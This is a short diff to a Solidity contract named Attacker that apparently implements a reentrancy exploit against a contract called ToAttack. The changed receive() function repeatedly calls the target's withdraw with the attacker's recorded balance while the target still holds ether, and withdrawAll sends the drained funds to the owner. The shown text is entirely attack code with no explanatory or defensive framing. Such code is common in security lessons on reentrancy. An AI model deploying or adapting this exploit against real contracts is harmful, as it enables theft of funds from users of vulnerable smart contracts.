@@ -9,6 +9,7 @@ contract Attacker {
 
     address owner;
 
+
     ToAttack toAttack;
 
     modifier onlyOwner(){
@@ -30,17 +31,17 @@ contract Attacker {
     }
 
 
-
     function withdrawAll()public onlyOwner{
         payable(owner).transfer(address(this).balance);
     }
 
 
 
-    receive()external payable{
+    receive() external payable{
+        uint amountToWithdraw = toAttack.balances(address(this));
+
         if(address(toAttack).balance > 0){
-            toAttack.withdraw(msg.value);
+            toAttack.withdraw(amountToWithdraw);
         }
     }
-
 }
